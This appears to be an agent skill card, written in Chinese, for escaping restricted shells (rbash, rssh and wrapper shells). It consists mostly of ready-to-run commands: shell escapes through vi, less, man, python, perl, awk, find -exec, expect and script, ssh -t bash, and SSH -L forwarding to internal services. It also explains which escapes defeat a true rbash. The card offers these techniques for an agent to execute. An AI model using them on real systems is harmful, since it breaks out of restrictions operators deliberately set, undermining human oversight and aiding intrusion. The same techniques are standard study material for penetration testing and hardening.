---
name: 'rbash-escape'
description: '受限Shell逃逸：rbash/rssh绕过→vi/less/ssh/etc。（检索词：rbash escape）'
metadata: { domain: linux, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## Restricted Shell (rbash/rssh) 逃逸

### 检测
```bash
echo "$0"           # -rbash 或 -rssh
echo $SHELL
# cd 失败、"command not found" 但命令存在 → 受限 shell
```

### 逃逸方法（按成功率排序）

#### 1. 编辑器逃逸
```bash
vi          → :!bash
vim         → :!bash
ed          → !bash
nano        → ^R ^X bash
emacs       → M-x shell
ne          → !bash
```

#### 2. 分页器逃逸
```bash
less /etc/passwd → !bash
more /etc/passwd → !bash
man man          → !bash
```

#### 3. SSH 逃逸（有 SSH 访问权限时）
```bash
ssh user@localhost -t bash
ssh user@localhost -t /bin/bash --norc --noprofile
# -L 端口转发也是绕过（不需要本地 shell）
ssh user@target -L 25151:127.0.0.1:25151
```

#### 4. 编程语言
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import os;os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
lua -e 'os.execute("/bin/bash")'
```

#### 5. 环境变量 PATH（🔴 真 rbash 下无效）
```bash
export PATH=/bin:/usr/bin:$PATH   # 真 rbash 明确禁止设置 PATH
```

🔴 **先分清面对的是哪一类** —— "rbash" 在实践中是两种完全不同的东西，逃逸手法互不通用：

| | 真 `rbash`（`bash -r`） | rssh / 自写 wrapper（只改 PATH） |
|---|---|---|
| 设置 `PATH` | **禁止** | 常有条件允许 |
| `cd` / 重定向 / `exec` | 禁止 | 视实现 |
| **命令名含 `/`** | **禁止** ← 关键差异 | 允许 |
| 直接打 `/bin/bash` | **必然失败** | 有效 |

一条命令即可判定：
```bash
/bin/echo probe     # 真 rbash → "restricted: cannot specify '/' in command names"
echo probe          # 对照：正常输出
```

#### 5b. 真 rbash 的正解：找**命令名不带斜杠**、但能 execve 子进程的工具
命令名不含 `/` 就能启动；它内部 exec 什么 rbash 管不着（那走 execve，不经过 shell）。
```bash
vi / less / man     → :!bash        # §1 / §2，首选
python3 -c 'import os;os.system("/bin/bash")'   # §4
perl -e 'exec "/bin/bash";'                     # §4
awk 'BEGIN{system("/bin/bash")}'                # §6
find / -exec /bin/bash \;                       # §6（-exec 走 execve）
```
🔴 §4/§6 里的 `/bin/bash` 带斜杠**没关系** —— 它不是 shell 的命令名，是子进程的 argv[0]。

#### 6. 其他工具
```bash
awk 'BEGIN{system("/bin/bash")}'
find / -exec /bin/bash \;
echo os.system("/bin/bash") | bash 2>/dev/null
expect -c 'spawn bash'
screen
tmux
script /dev/null -c bash
```
🔴 本节的 `awk` / `find -exec` / `… | bash` **在真 rbash 下同样有效**：命令名（`awk`/`find`/`bash`）
都不带斜杠，`/bin/bash` 只是交给子进程 execve 的 argv[0]。它们是 §5b 的主力。

#### 7. 文件系统（🔴 真 rbash 下 `cp ... && /tmp/bash` 无效）
```bash
cp /bin/bash /tmp/bash && /tmp/bash    # ✗ 最后一步 /tmp/bash 含斜杠 ⇒ 被拒
```
能用 `cp` 不代表能执行拷出来的副本。真 rbash 下走 §5b；只有**确认是 wrapper 类**时这条才有意义。

### 注意
- 🔴 真 rbash 的限制是**五条**，不止 PATH + 禁 `cd` + 禁重定向：还禁止设置 `PATH`/`SHELL`/`ENV`/`BASH_ENV`、禁止**命令名含 `/`**、禁止 `exec` 与 `enable -f/-p`。把 rbash 与"仅 PATH 受限的 rssh/wrapper"混同，是本卡原先最大的错（2026-10-10 实测修正：`bash -r -c '/bin/echo hi'` → `restricted: cannot specify '/' in command names`，exit 1）。
- 核心思想仍是**找到能执行外部命令的任何工具** —— 但要选**命令名不含斜杠**的那个。
- 如果所有工具都被限制 → SSH -L 端口转发到内网服务，不依赖本地 shell
